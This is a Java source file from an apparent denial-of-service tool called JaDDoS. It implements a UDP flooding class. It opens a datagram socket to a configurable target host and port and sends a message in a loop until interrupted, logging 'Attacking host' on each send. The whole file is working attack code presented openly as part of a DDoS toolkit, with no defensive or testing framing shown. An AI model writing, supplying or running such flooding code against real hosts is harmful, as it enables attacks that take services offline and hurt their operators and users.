/***
 * Copyright (c) 2021 Shehan Dhaleesha
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 */

package com.jaddos.protocol;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

import org.apache.log4j.Logger;

import com.jaddos.core.JaDDoS;
import com.jaddos.core.JaDDoSPattern;

/**
 * Class implementation of UDP protocol
 * 
 * @author ShehanD
 *
 */
public class JaDDoSUDPProtocol extends JaDDoS implements IJaDDoSUDPProtocol {

	/** Logger instance */
	private Logger logger = Logger.getLogger(JaDDoSUDPProtocol.class);

	/** Instance of the current socket. */
	private DatagramSocket socket;

	/** Instance of the current packet. */
	private DatagramPacket packet;

	/** Constructor */
	public JaDDoSUDPProtocol(JaDDoSPattern ddosPattern) {
		super(ddosPattern);
	}

	@Override
	public void run() {
		createSocket();
		connectToSocket();

		while (!Thread.currentThread().isInterrupted() && !socket.isClosed()) {
			writeLineToSocket(getDdosPattern().getMessage());
			logger.info("Attacking host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());

			try {
				Thread.sleep(getDdosPattern().getTimeout());
			} catch (InterruptedException e) {
				logger.error("Unable to perform the attack: " + e.getMessage(), e);
			}
		}
		closeSocket();

	}

	@Override
	public void writeLineToSocket(String message) {
		byte[] data = message.getBytes();
		getPacket().setData(data);
		getPacket().setLength(data.length);
		try {
			getSocket().send(getPacket());
		} catch (IOException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}
	}

	@Override
	protected void createSocket() {
		try {
			socket = new DatagramSocket(0);
			socket.setSoTimeout(getDdosPattern().getSocketTimeout());
		} catch (SocketException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}

	}

	@Override
	protected void connectToSocket() {
		setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
		packet = new DatagramPacket(new byte[1], 1, getAddress());

	}

	@Override
	protected void closeSocket() {
		if (socket != null && !socket.isClosed() && socket.isBound()) {
			socket.close();
		}

	}

	@Override
	public DatagramSocket getSocket() {
		return socket;
	}

	@Override
	public void setSocket(DatagramSocket socket) {
		this.socket = socket;

	}

	@Override
	public DatagramPacket getPacket() {
		return packet;
	}

	@Override
	public void setPacket(DatagramPacket packet) {
		this.packet = packet;

	}

}
